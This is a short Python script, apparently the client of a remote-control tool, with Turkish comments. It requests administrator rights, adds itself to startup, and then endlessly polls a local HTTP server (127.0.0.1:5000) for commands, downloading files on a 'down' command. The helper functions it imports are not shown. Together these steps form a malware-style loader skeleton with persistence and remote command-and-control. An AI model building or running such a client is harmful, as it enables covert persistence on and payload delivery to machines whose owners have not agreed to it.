from src import *
import time

apiuriloc = "http://127.0.0.1:5000/"

def main():
    if is_admin():
        print("Yönetici izni alındı!")
        add_to_startup()
    else:
        print("Yönetici izni gerekli!")
        request_admin_permission()

def dedector():
    previous_command = None  # Önceki komutun takibi için

    while True:
        dedec_command = dedec(apiuri=apiuriloc)  # dedec() çağrısı, bir komut döndürüyor
        if dedec_command != previous_command:  # Yeni bir komut kontrolü
            previous_command = dedec_command
            dedec_split = dedec_command.split()
            print(f"Gelen komut: {dedec_split}")

            if dedec_split[0] == "down" and len(dedec_split) > 1:
                file_url = f"http://127.0.0.1:5000/download/{dedec_split[1]}"
                save_path = dedec_split[1]
                print(f"Dosya indiriliyor: {file_url} -> {save_path}")
                download_file(file_url, save_path)
            else:
                print("Geçersiz komut veya eksik bilgi!")

if __name__ == "__main__":
    main()
    while True:
        dedector()